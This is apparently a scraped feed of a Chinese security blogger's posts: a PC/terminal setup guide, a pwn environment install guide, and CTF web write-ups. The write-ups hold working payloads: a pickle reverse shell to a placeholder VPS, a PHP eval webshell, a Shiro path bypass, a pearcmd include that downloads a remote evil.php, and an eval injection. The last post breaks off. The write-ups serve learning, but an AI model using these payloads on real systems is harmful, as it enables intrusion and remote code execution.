或者三指的触摸手势要比点击切换应用页面更方便（况且平时只显示桌面的情景很少，大部分情况下都是开一堆堆的页面\nwin10的磁贴我真的太爱了\n除了偶尔会出Bug 重启个系统结果我排好的顺序全整没了😅崩过好几次了已经\n有些工具在文件夹中，就没有全贴上来了，完整的形态应该是一个心型~\n指针必须花哨 有谁能拒绝小豆泥呢！\nshell\u0026amp;terminal zshell zhell多好用不用我多说吧？kali默认的就是zshell，高亮、代码补全等功能是真的太贴心了，bash跟它一比真是相形见绌，所以我的linux虚拟机以及vps都上了zhell\u0026amp;oh-my-zsh；试了一些主题，但还是默认的robbyrussell深得我心……\n只有皮肤也不行，还得配上给力的插件——zsh-syntax-highlighting（语法高亮）和zsh-autosuggestions（根据历史记录自动补全）\nwindows terminal win自带的cmd和powershell，只能说懂得都懂——一个是大黑框一个是大蓝框，前者简陋至极，后者的报错页面（蓝底红字）看着能让人心跳骤停，即使我已经尽力设置背景透明、显示的颜色，出来的效果也不尽人意\n这时Terminal这个神奇的东西就来救场了——配合pwsh7\u0026amp;oh-my-posh几乎可以达到类zsh的体验\n此处的shell主题是ys（对没看错 就是zsh下很火的那个），背景图id=89393158，配色方案是ayu_light，字体是12号Cascadia Code PL；加载了posh-git和oh-my-posh模块，并设置了PSReadLine\n这样一来我们的pwsh也有了根据历史记录自动补全、tab选择目录这样的功能（更多的功能可以参照官方文档自行设置）\n同时**win+`**这个快捷键可以呼出临时停靠窗口“焦点终端”\n对临时想要执行个脚本、连以下vps、查个东西什么的简直不能更方便！\n同时它还支持通过json来添加配置文件，可以将自己的vps直接加进来\n再设置ssh-key就可以一键免密登录啦了！\n唯一的缺憾，就是不像final shell一样有很好的文件上传下载以及ftp的功能，不然可以直接革了其它ssh终端的命（说的就是你 finalshell）\n必不可少的小工具 everything 曾经年少轻狂的我固执的认为这种东西是给命名文件不规范的人准备的\n后来我发现我错了……everything真香！！！！\n它能非常非常迅速的找到我想要的文件，还能进行预览，太好用了简直是\nSnipaste 最强截图工具了，截图后可以贴在屏幕上，调整大小、透明度、简单的涂鸦标注都不在话下，占用内存也比较小，装机必备~\nCClose 又一个装机必备了\n就说这些功能还有谁不心动！！！！！！内存占用也很小，可以说极大的提升了我平常的学习效率\n（建议自启动+以管理员模式开启（防止某些过了UAC的应用它没有权限\nDigital Clock 就是这个会一直出现在我各种截图中的小部件够简单，这个大小放在屏幕上也十分合适，还可以设置透明度 不会挡到文字\n但是不知道从什么时候开始在关机的时候会报个错，然后不会保存我已设置好的颜色方案，导致再次开机后需要重新设置\n另外这玩意的内存占用竟然有16M……感觉跟功能并不是十分匹配啊 就只不过在屏幕上层显示而已（但是很可惜没有找到适合的替代品TAT\n*TileBeautify 磁贴美化工具，可以将磁贴换成任意的图片，进行组合之后会很好看\n（但是吧 我换电脑之后就没折腾这个了 因为不方便\n 说实话这篇文档的创建时间是\n别骂了，都是我太懒狗\n之后一定会认真起来的，不管是学习上，生活上，还是个人的发展上\n每天做题什么的，发现自己是真的菜，是真的铁沸物，跟大家比起来我真的水平太低了，是不值一提的那种\n害，不多说了\n 跟别人学，和自己比\n ","date":"2021-10-28T13:42:14+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/beautify-my-pc/","section":"posts","tags":[],"title":"生产力提(mei)高(hua)之路"},{"categories":["环境配置"],"contents":"以下为Ubutun16.04\u0026amp;py2的安装过程，其他版本命令几乎相同的~（Ubuntu20\u0026amp;py3的我也装了一个，毕竟py3是主流，技术总是向前发展的嘛~）\n————毕竟我是以初学者的视角来准备pwn的环境，肯定还有很多不全面\u0026amp;想不到的地方，之后用到了会回来补上的~\n安装pip2\u0026amp;pip3\u0026amp;ipython\ncurl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py sudo python get-pip.py # sudo apt-get install python3-pip curl https://bootstrap.pypa.io/pip/3.5/get-pip.py -o get-pip.py sudo python3 get-pip.py sudo apt-get install ipython 安装py2的pwntools\npip2 install pathlib2 # py3无需此条 pip2 install pwntools 安装GDB\u0026amp;插件\nsudo apt-get install git git clone https://github.com/pwndbg/pwndbg.git ./setup.sh # 使用peda-heap git clone https://github.com/Mipu94/peda-heap.git echo \u0026quot;source ~/peda-heap/peda.py\u0026quot; \u0026gt; ~/.gdbinit # 使用peda git clone https://github.com/longld/peda.git echo \u0026quot;source ~/GDB-Plugins/peda/peda.py\u0026quot; \u0026gt; ~/.gdbinit # 使用gef git clone https://github.com/hugsy/gef.git echo \u0026quot;source ~/gef/gef.py\u0026quot; \u0026gt; ~/.gdbinit # 使用pwndbg echo \u0026quot;source ~/pwndbg/gdbinit.py\u0026quot; \u0026gt; ~/.gdbinit # 自动切换脚本 https://blog.csdn.net/aptx4869_li/article/details/81566541 安装one_gadget\nsudo apt-add-repository ppa:brightbox/ruby-ng sudo apt-get update sudo apt-get install ruby2.7 ruby2.7-dev sudo apt-get install gem sudo gem install one_gadget 安装32位库\nsudo apt-get install lib32ncurses5 sudo apt-get install lib32z1 安装checksec\nsudo apt instal checksec 安装seccomp-tools\nsudo gem install seccomp-tools 安装zshell\u0026amp;插件\nsudo apt-get install zsh sh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026quot; # zsh-syntax-highlighting git clone https://github.com/zsh-users/zsh-syntax-highlighting.git echo \u0026quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\u0026quot; \u0026gt;\u0026gt; ${ZDOTDIR:-$HOME}/.zshrc source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh # zsh-autosuggestions git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh # 如遇报错 error: RPC failed; result=35, HTTP code=0; fatal: The remote end hung up unexpectedly # 将git clone https://xxxx/xxxx.git 换为git clone git://xxxx/xxxx.git 安装virtualbox增强功能\n# 遇报错 unable to access “VBox_GAS_6.0.0 iso9660” sudo apt-get install --reinstall linux-image-$(uname -r) 最后结果\nubuntu20+py3+zsh（应该能看出来我更喜欢这个x\nubuntu16+py2\n 第一次装的时候直接卡在了pwntools上，后来发现原因是pip2版本过低且无法直接通过pip -m pip install --upgrade pip进行升级，只能手动下载get-pip.py后通过py2运行来安装\n这次配完之后最大的感触就是该换个大一点的硬盘了，512G属实绷不住我搞这么多虚拟机……\n之后可能会抽空学一下pwn，属于是web狗卷不动了要给自己找个后路（虽然百分之九十九的概率是两个都很菜，xs），卷起来卷起来！！！\n","date":"2021-10-28T00:41:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/pwn-env-init/","section":"posts","tags":["pwn"],"title":"pwn环境配置"},{"categories":["CTF"],"contents":" web有3个都是有了包浆的原题……还有一点脑洞题，反正奇奇怪怪的\n属于是被师傅们带飞了，所以详细的wp还是自己写一写，认真地复现一下\n zerocalc emmmmmm 说实话一开始没有出 因为没悟出来它这是个什么逻辑2333333\nezPickle # 用pker.py生成payload notadmin=GLOBAL('config','notadmin') notadmin[\u0026quot;admin\u0026quot;]=\u0026quot;yes\u0026quot; exec=GLOBAL('config','backdoor') payload='''__import__('subprocess').call(\\\u0026quot;echo -e '#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1'\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026quot;,shell=True)''' exec(payload) return \u0026gt;\u0026gt;\u0026gt; data=b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\\\\\\\u0026#39;subprocess\\\\\\\u0026#39;).call(\u0026#34;echo -e \\\\\\\u0026#39;#!/bin/bash\\\\\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\\\\\\\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\u0026#34;,shell=True)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(base64.b64encode(data)) b\u0026#39;xxxxxxxxxx\u0026#39; 没什么好说的，基础的pickle题，是2021巅峰极客what_pickle的阉割版（构造的思路几乎一样 但是简单很多），几乎一样的题目还有 [SUCTF 2019]Guess Game\n限制的点在于只允许引入题目自设模块\u0026amp;限制模块中含下划线，那就直接变量覆盖，然后利用给出的eval()弹shell就好了\n————另外这里的payload也可以是简短版本的弹sehll的payload 不唯一嘛\ndata = b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; 一个需要注意的点是由于这里的反序列化入口是get传参，所以遇到+号会出问题，传进去之前要先urlencode(encode all special chars)\n————顺带练个手，搓一个不含b'R'的opcode（用b'o'代替）\ndata = b\u0026#39;\u0026#39;\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0(g2\\ng3\\no.\u0026#39;\u0026#39;\u0026#39; 传参的时候记得再urlencode一下~~~\n————之前我的总结笔记已经相当全面了 可以出CTF教科书了233333\nJack-Shiro 属于是原题了属于是属于是属于是烤烂了已经，参见 [红明谷CTF 2021] JavaWeb | [天翼杯 2021] jackson | [NPUCTF2020] EzShiro （虽然我自己根本没发现 实在是做过的题太少了 java更是不会 我的\n/login下有个登录，回显/json，返回的cookie有个rememberMe=deleteMe，可以知道是shiro\n访问/json，后面会带一堆get请求的参数，用/;/json绕过（cve-2020-11989）\n上工具JNDI-Injection-Exploit一把梭（问题出在我vps上没有java环境 端口转发又处了亿点点问题…… 所以没有带出来flag），是cve-2020-36188\n哭哭\n还有个工具是 LdapBypassJndi，差不多的；下面是跟一跟涉及到的几个链子\nCVE-2020-11989 参考：Apache Shiro权限绕过漏洞分析(CVE-2020-11989) | Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)\nApache Shiro是一个常用的java安全框架，在1.5.3之前版本中当Shiro与Spring动态控制器一起使用时（Spring框架中只用Shiro鉴权），如果直接访问/shiro/admin/page会302跳转要求登录，而访问/;shiro/admin/page即可绕过权限验证，访问/admin的信息\n本地环境搭建\u0026amp;复现 有带佬直接写好的docker可以直接pull拿来用\ndocker pull jackey0/cve-2020-11989 docker run -p 8426:8080 \u0026lt;image\u0026gt; /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar' docker pull jackey0/cve-2020-13933 // docker start \u0026lt;container-id\u0026gt; 或者下载l3yx/springboot-shiro项目到本地编译为war包（或者也有编译好的shiro.war）之后手动放入tomcat下的webapps目录下运行。显然docker太香了！！！！！\n访问映射到外部的8426端口，环境搭建完毕\npost方式请求/doLogin页面，看到cookie中含rememberMe=deleteMe，确定为shiro\n访问/admin/page页面，302重定向至/login页面要求登录\n访问/;/admin/page页面，绕过鉴权，回显admin page\n源码分析\u0026amp;动调 先把jar包下载到在本地，导入idea\ndocker cp \u0026lt;container-id\u0026gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/ 使用idea远程对docker中部署的springboot项目进行debug\ndocker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar' Shiro的权限校验是通过判断url的匹配来进行的，如果Shiro获取的url和web框架处理的url结果不一致时就造成了权限绕过；Shiro对于url的获取和匹配在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain中进行。\n以访问/;/admin/page为例，通过它的getPathWithinApplication()得到的requestURI=\u0026quot;/\u0026quot;\n跟入此函数的处理逻辑org.apache.shiro.web.util.WebUtils#getPathWithinApplication，进入getRequestUri()\n我们可以看到在中间过程中uri=\u0026quot;/;/admin/page\u0026quot;，但是从上面我们可以知道经过normalize(decodeCleanUriString())处理过后返回的requestRUI=\u0026quot;/\u0026quot;，跟入这个函数，它先是调用decodeRequestSrting()，没有对结果产生什么影响，\n而返回时的normalize()会根据\u0026quot;;\u0026ldquo;进行url的截断处理，最终返回\u0026rdquo;/\u0026quot;\n回到开头的/;/admin/page请求，spring中处理url的函数在org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping\n它调用的是springframework中自己getPathWithinApplication()，经过一番骚操作返回的是/admin/page\n跟入getPathWitinApplication()，先是调用getContextPath()，返回\u0026quot;/\u0026quot;\n然后是getRequestUri()\n同样，在最终return之前的uri=\u0026quot;/;/admin/page\u0026quot;，经过了一个decodeAndCleanUriString()，根据ch=59也就是\u0026quot;;\u0026ldquo;符进行一个分割，使用removeSemicolonContentInternal()\n于是\u0026rdquo;;\u0026ldquo;就不见了\n然后返回\u0026rdquo;/admin/page\u0026quot;给getPathWithinApplication()\n再传递给getPathWithinServletMapping()\n最终我们访问到的页面就是\u0026quot;/admin/page\u0026quot;了\n————总结一下就是当url在shiro和spring中的处理不一致，当进入应用时被认作是访问\u0026quot;/;/admin/page\u0026quot;，不属于我们最初配置的\u0026quot;/admin/*\u0026ldquo;权限路由，而进入shiro后却被截断处理，认作是\u0026rdquo;/admin/page\u0026quot;，属于权限路由中，最终做到权限绕过\nCVE-2020-13933 由于11989的修补并不完全，导致又又又被绕过产生了13933……\n本地环境搭建\u0026amp;复现 参考：shiro \u0026lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)\n还是采用docker形式复现（我爱docker）这里直接就是远程调试的启动命令啦，跟上面的一样配置就好了（\ndocker pull jackey0/cve-2020-13933 docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar' 访问/admin，报错页面且无302跳转；访问/login跳转到身份验证页面；访问/admin/%3bpage，无身份验证且返回admin page\n原理分析\u0026amp;动调 还是导入jar包至idea，远程debug\n直接看看shiro1.6.0的补丁补到了什么地方，在github上查看diff\n增加了InvalidRequestFilter类，有个isAccessAllowed()函数，在全局上对分号、反斜杠、非ASCII码字符进行了过滤\n以访问/admin/%3bpage为例，url先由shiro解析，还是org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain，依旧是调用getPathWithinApplication()，执行后requestURI=\u0026quot;/admin/\u0026quot;\n而之后进入springboot处理时，却变成了\u0026quot;/admin/;page\u0026quot;\n再回到最初跟一下具体的调用链\n在removeSemicolon()处理前，uri=\u0026quot;/admin/;page\u0026quot;（经decodeAndUriString()解码了）\n处理后path=\u0026quot;/admin\u0026quot;，接着调用normalize()函数变成\u0026quot;/admin\u0026quot;，传递给最初的getChain()中的requestURI参数\n之后被spring处理org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping，其中会调用getRequestUri()，它会再次调用decodeAndCleanUriString()\n先removeSemicolonContent()再decodeRequestString()，那显然是怎么都去不掉\u0026quot;;\u0026ldquo;了，将\u0026rdquo;;page\u0026quot;看作一个整体\n我们回过头去看这次的权限设置是怎么匹配url的，定位到org.syclover.srpingbootshiro.LoginController和org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean\n可以看到，对于\u0026quot;/admin/*\u0026ldquo;需要鉴权，\u0026quot;/admin/{name}\u0026ldquo;返回admin page，而对于\u0026rdquo;/admin/\u0026ldquo;却没有设置权限\n从上面的调试中我们知道shiro得到的是\u0026rdquo;/admin/\u0026quot;（先decode再去除\u0026rdquo;;\u0026quot;），被认作可以访问；而spring得到的是\u0026quot;/admin/;page\u0026quot;）先去除\u0026quot;;\u0026ldquo;再decode），与\u0026rdquo;/admin/{name}\u0026ldquo;的样式匹配，最后返回admin page （简直太完美了也\n*临时修复 （本地暂时还未复现\nmap.put(\u0026quot;/admin/**\u0026quot;, \u0026quot;authc\u0026quot;); @GetMapping({\u0026quot;/admin/page\u0026quot;}) public String admin() { return \u0026quot;admin page\u0026quot;; } ***CVE-2020-36188 ch.qos.logback.core.db.JNDIConnectionSource\n可以参考 https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro，工具 LdapBypassJndi | JNDI-Injection-Exploit\n————由于我的java水平实在够呛，这里暂时先空着，等我学一学java 之后必定回来鞭尸\nEasyFilter \u0026lt;?php ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;./\u0026#34;); if(!isset($_GET[\u0026#39;action\u0026#39;])){ highlight_file(__FILE__); die(); } if($_GET[\u0026#39;action\u0026#39;] == \u0026#39;w\u0026#39;){ @mkdir(\u0026#34;./files/\u0026#34;); $content = $_GET[\u0026#39;c\u0026#39;]; $file = bin2hex(random_bytes(5)); file_put_contents(\u0026#34;./files/\u0026#34;.$file,base64_encode($content)); echo \u0026#34;./files/\u0026#34;.$file; }elseif($_GET[\u0026#39;action\u0026#39;] == \u0026#39;r\u0026#39;){ $r = $_GET[\u0026#39;r\u0026#39;]; $file = \u0026#34;./files/\u0026#34;.$r; include(\u0026#34;php://filter/resource=$file\u0026#34;); } /?action=w\u0026amp;c=\u0026lt;?php @eval($_POST['wuhu']);?\u0026gt; /?action=r\u0026amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9 POST: wuhu=phpinfo(); 对于payload的底层代码分析 原理分析来自Guoke佬 我只是个会复现的铁沸物……\n首先下一份7.2.34的源码\n定位到包装器所在的文件位置/ext/standard/php_fopen_wrapper.c，178行起是php_stream_url_wrap_php()的代码\n191行，先碰到php://会执行path += 6；之后接着349行会碰到filter/\n没有mode，此时\npath=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 357行执行strdup()，把path第6位之后的内容赋给pathdup指针上\npathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 358行strstr()返回pathdup的指针中/resource=出现的位置，到365行的判断\np+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 372行的php_strtok_r()对pathdup+1的位置以'/\u0026lsquo;为标志进行分割\np=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 得到resource=，进373行的while循环，先是到378行的php_stream_apply_filter_list()，转至159行\n将p作为过滤器进行注册，161行php_stream_filter_append()应用到文件流上，但显然resource不是流包装器，干不了事，那就再到while循环里接着向后找，直到向后碰到read\np=/read=convert.base64-decode/resource=/../../../../../1.txt 进入374行，执行php_stream_apply_filter_list之后就变成了\np=convert.base64-decode/resource=/../../../../../1.txt 此时的p=convert.base64-decode，就可以正常的b64解码我们的内容了\n再回头看这个题 代码很短，限制在于写入的文件内容被b64加密\u0026amp;open_basedir\u0026amp;include已经写好的包装器和一部分固定的内容\n我刚开始卡在了已经写死的包装器的开头还怎么加conver.base64-decode？然后发现是我想多了，可以接着套，底层原理见上，会向后循环取值直到碰到一个正常的流包装器\n第二个问题就是目录穿越了，前面加了5层buff，从结果倒推感觉可以理解，但是自己却没试出来，我的问题\n最后open_basedir的绕过反而是最轻松的，蚁剑插件直接搞\n参考：深入理解PHP之require/include顺序 | Exploit with PHP Protocols / Wrappers | 谈一谈php://filter的妙用\nnew_hospital 响应cookie会有个API\n将API设为flag.php ZmxhZy5waHA%3d\n扫目录 得到/old/feature.php 将路径改为这个\n将API改为../flag.php Li4vZmxhZy5waHA%3d\n————其实如果先扫目录扫到/old/feature.php的话，可以将API设为./feature.php Li9mZWF0dXJlLnBocA%3d%3d 读到这一段\n后端的逻辑就是将cookie[\u0026lsquo;api\u0026rsquo;]取出，直接读出内容\n有一点点脑洞，也跟眼力见有关系，我一开始是真没注意到这个cookie的API字段，属实是有点大病；之后做题还是要开环境之后就连burp，注意观察响应头的特殊字段 cookie的类型/ctrl+u的源码/可能会有的控制台的提示信息/robots.txt这些东西，不要遗漏，不然就很可惜了\nGive_me_you_0day 这里考察的点并不是Typecho 1.1/17.10.30版本的0day（给出的源码就完全是github上的发行版），而是install.php中 608行存在一个文件包含\n利用这个文件包含的点来搞，payload可以直接参考[RCTF 2021] VerySafe\n打的点在于peclcmd，这里涉及到的题和知识害挺多，之前真没见过（dbq是我做的题太少太少了），在这里一并学习了\n关于register_argc_argv配置项 是php.ini核心配置中的一个选项，默认是这样手册是这样写的\n从php=4.0.0后为可设置的选项（此前总为On）默认为开启状态，当php\u0026lt;=4.2.3时可修改范围是PHP_INI_ALL，更详细的内容可以参见-\u0026gt;PHP的命令行模式\n在register_argc_argv开启的情况下，cgi和cli模式下都可以直接访问到传入的参数；其中argc是传递过去的参数的个数，argv是包含有实际参数的数组；cli模式测试如下\n\u0026lt;?php var_dump($_SERVER[\u0026#39;argv\u0026#39;]); // var_dump($HTTP_SERVER_VARS[\u0026#39;argv\u0026#39;]); var_dump($argv); cgi的话，直接用上面的$_SERVER['argv']是不会获取到值\n直接查看$_SERVER这个大数组，可以发现我们的参数在这里是以一整个QUERY_STRING的形式出现的（详细的数组解析-\u0026gt;PHP超全局变量$_SERVER的用法）\n有个特殊的trick在于，如果是\n/test.php?a=1\u0026amp;b=1 确实是两个参数，但返回的$_SERVER[\u0026lsquo;argv\u0026rsquo;]为1，如果是\n/test.php?a=1+b=1 则会被截断，返回$_SERVER[\u0026lsquo;argv\u0026rsquo;]则为2（说实话我本地真没跑出来这个 可能是哪里的配置有问题？但是看了很多资料，这里应该是可以被复现成功的………………emmmm 有一点点离谱）\n关于pear命令 pear是the PHP Extention and Application Repository的缩写，是一个PHP扩展与应用的代码仓库，pear仓库代码以包package分区，每一个pear package都是一个独立的项目，有自己独立的开发团队、版本控制、文档和其他包的依赖关系信息；pear package以phar, tar, zip形式发布，通过apt install php-pear来安装\npear命令的实现是一个sh脚本\n#!/bin/sh  # first find which PHP binary to use if test \u0026#34;x$PHP_PEAR_PHP_BIN\u0026#34; != \u0026#34;x\u0026#34;; then PHP=\u0026#34;$PHP_PEAR_PHP_BIN\u0026#34; else if test \u0026#34;/usr/local/bin/php\u0026#34; = \u0026#39;@\u0026#39;php_bin\u0026#39;@\u0026#39;; then PHP=php else PHP=\u0026#34;/usr/local/bin/php\u0026#34; fi fi # then look for the right pear include dir if test \u0026#34;x$PHP_PEAR_INSTALL_DIR\u0026#34; != \u0026#34;x\u0026#34;; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=\u0026#34;-d include_path=$PHP_PEAR_INSTALL_DIR\u0026#34; else if test \u0026#34;/usr/local/lib/php\u0026#34; = \u0026#39;@\u0026#39;php_dir\u0026#39;@\u0026#39;; then INCDIR=`dirname $0` INCARG=\u0026#34;\u0026#34; else INCDIR=\u0026#34;/usr/local/lib/php\u0026#34; INCARG=\u0026#34;-d include_path=/usr/local/lib/php\u0026#34; fi fi exec $PHP -C -q $INCARG -d data.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=\u0026#34;\u0026#34; -d safe_mode=0 -d register_argc_argv=\u0026#34;On\u0026#34; -d auto_prepend_file=\u0026#34;\u0026#34; -d auto_append_file=\u0026#34;\u0026#34; $INCDIR/pearcmd.php \u0026#34;$@\u0026#34; 从最后一行可以看到调用了/pearcmd.php，而这个pearcmd.php的参数$argv就来源于$_SERVER[\u0026lsquo;argv\u0026rsquo;]，这个是我们可控的传入参数\n利用pear命令执行任意文件下载 如图，直接下载开启了http服务器的目录下的指定文件到当前所在目录\n使用install -R而非download可以控制下载到任意目录，比如直接下载到web服务的目录\n所以总体思路+payload 如果存在这样的环境\n 安装pear 开启register_argc_argv 存在可控的传入参数来做到文件包含（比如include $_GET['f'].php） 可以出网  我们就可以做到任意文件下载从而getshell；前面也提到register_argc_argv继续PHP_IN_PREDIR，我们可以留一个.user.ini的后门来设置register_argc_agrv为On\npayload就是这样了\n// 存在 include $_GET['f'].php // web目录可写 - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp目录可写 - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil 首先要包含一个正确位置的pearcmd.php（通常在/usr/local/lib/php/pearcmd.php），接着包含\u0026amp;+download+http://your_vps/eval.php（或者如果前面直接是/pearcmd.php的话就可以直接给参数了/pearcmd.php+download+http://your_vps/eval.php）来装🐎（注意路径是否正确），之后再包含我们的🐎即可\n其它的例题 [CampCTF 2015] Trolol\n[巅峰极客 2020] MeowWord\n[RCTF 2021] VerySafe\n 还是做的题不够多，已有的知识也应用的不够熟练，实在是太太太太太菜了，得好好学，不能天天划水摸鱼\n","date":"2021-10-26T20:17:24+08:00","permalink":"https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/","section":"posts","tags":["wp"],"title":"2021强网拟态 Wp"},{"categories":["CTF"],"contents":"Web/迷路的魔法少女  魔法少女迷失在了代码空间 请寻找她现在在哪\n \u0026lt;?php highlight_file(\u0026#39;index.php\u0026#39;); extract($_GET); error_reporting(0); function String2Array($data) { if($data == \u0026#39;\u0026#39;) return array(); @eval(\u0026#34;\\$array = $data;\u0026#34;); return $array; } if(is_array($attrid) \u0026amp;\u0026amp; is_array($attrvalue)) { $attrstr .= \u0026#39;array(\u0026#39;; $attrids = count($attrid); for($i=0; $i\u0026lt;$attrids; $i++) { $attrstr .= \u0026#39;\u0026#34;\u0026#39;.intval($attrid[$i]).\u0026#39;\u0026#34;=\u0026gt;\u0026#39;.\u0026#39;\u0026#34;\u0026#39;.$attrvalue[$i].\u0026#39;\u0026#34;\u0026#39;; if($i \u0026lt; $attrids-1) { $attrstr .= \u0026#39;,\u0026#39;; } } $attrstr .= \u0026#39;);\u0026#39;; } String2Array($attrstr); /?attrid[]=\u0026amp;attrvalue[]=\u0026quot;);phpinfo();// 参考：CG-CTF 变量覆盖(PHP extract函数利用) | CTF-PHP黑魔法\nMisc/WELCOME DASCTFxJlenu  欢迎来到魔法的世界（签到）\n 可是有几层包浆的原题了属于是，之前绝对做过一次\n","date":"2021-10-24T16:47:40+08:00","permalink":"https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/","section":"posts","tags":["wp"],"title":"DasCTF1021 Wp"},{"categories":["CTF"],"contents":"Web/git commit -m \u0026ldquo;whatever\u0026rdquo;  Visit the website\n emmmm 联系这个题目 访问一下.git看看有没有备份文件泄露\n用GitHacker下载泄露的git文件，有一个index.php\n\u0026lt;?php /** * Simple sodium crypto class for PHP \u0026gt;= 7.2 * @author MRK */ class crypto { /** * * @return type */ static public function create_encryption_key() { return base64_encode(sodium_crypto_secretbox_keygen()); } /** * Encrypt a message * * @param string $message - message to encrypt * @param string $key - encryption key created using create_encryption_key() * @return string */ static function encrypt($message, $key) { $key_decoded = base64_decode($key); $nonce = random_bytes( SODIUM_CRYPTO_SECRETBOX_NONCEBYTES ); $cipher = base64_encode( $nonce . sodium_crypto_secretbox( $message, $nonce, $key_decoded ) ); sodium_memzero($message); sodium_memzero($key_decoded); return $cipher; } /** * Decrypt a message * @param string $encrypted - message encrypted with safeEncrypt() * @param string $key - key used for encryption * @return string */ static function decrypt($encrypted, $key) { $decoded = base64_decode($encrypted); $key_decoded = base64_decode($key); if ($decoded === false) { throw new Exception(\u0026#39;Decryption error : the encoding failed\u0026#39;); } if (mb_strlen($decoded, \u0026#39;8bit\u0026#39;) \u0026lt; (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) { throw new Exception(\u0026#39;Decryption error : the message was truncated\u0026#39;); } $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, \u0026#39;8bit\u0026#39;); $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, \u0026#39;8bit\u0026#39;); $plain = sodium_crypto_secretbox_open( $ciphertext, $nonce, $key_decoded ); if ($plain === false) { throw new Exception(\u0026#39;Decryption error : the message was tampered with in transit\u0026#39;); } sodium_memzero($ciphertext); sodium_memzero($key_decoded); return $plain; } } $privatekey = \u0026#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=\u0026#34;; $flag = file_get_contents(\u0026#39;../flag.txt\u0026#39;); $enc = crypto::encrypt($flag, $privatekey); echo $enc; ?\u0026gt;包含了解密的模块，所以用它解密一下即可\n————这里我的本地php一直出问题 版本7.3.4和7.4.21都报错\nWeb/notrequired  Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?\n 注意到链接是http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html\n用伪协议看一下index.php的源码/index.php?file=php://filter/convert.base64-encode/resource=index.php\n访问/bin/secrets.txt，得到 